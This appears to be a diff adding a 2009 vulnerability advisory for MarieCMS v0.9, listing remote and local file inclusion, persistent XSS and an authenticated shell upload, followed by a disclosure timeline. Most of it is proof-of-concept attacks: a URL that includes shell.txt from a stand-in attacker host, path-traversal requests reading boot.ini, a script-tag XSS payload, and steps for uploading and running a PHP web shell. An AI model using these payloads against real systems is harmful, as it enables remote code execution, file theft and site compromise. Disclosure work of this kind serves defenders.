@@ -1,0 +1,50 @@
+############
+ OVERVIEW
+############
+
+MarieCMS v0.9 vulnerable to following issues:
+
+++ Remote File Inclusion
+++ Local File Inclusion
+++ Persistent XSS
+++ Shell Upload (Authenticated User)
+
+######################
+ PoC
+######################
+
+# Remote File Inclusion:
+++++++++++++++++++++++++
+
+http://server/mariecms/?page=http://[attacker]/[site]/shell.txt?
+
+# Local File Inclusion:
++++++++++++++++++++++++
+
+http://server/mariecms/?mod=../../../../../../../../../../boot.ini%00
+http://server/mariecms/admin/index.php?mod=../../../../../../../../../../../../boot.ini%00
+
+# Persistent XSS:
++++++++++++++++++
+
+Put <script>alert("XSS")</script> in "Name" field on page
+http://server/mariecms/?page=addgb&mod=gaestebuch
+
+# Shell Upload (Authenticated User):
++++++++++++++++
+
+1. Rename shell.php to shell.jpg.php
+2. Upload it into galleryupload section.
+3. View images to get image id for shell.jpg.php
+4. Access shell:
+http://[server]/[path]/_images/[image_id].php?cmd=dir
+
+
+
+############
+ TimeLine
+############
+
+Bug discovered 			: 26/11/2009
+Informed Vendor			: 30/11/2009 -- No reply received from vendor till the date
+Public Disclosure		: 02/12/2009
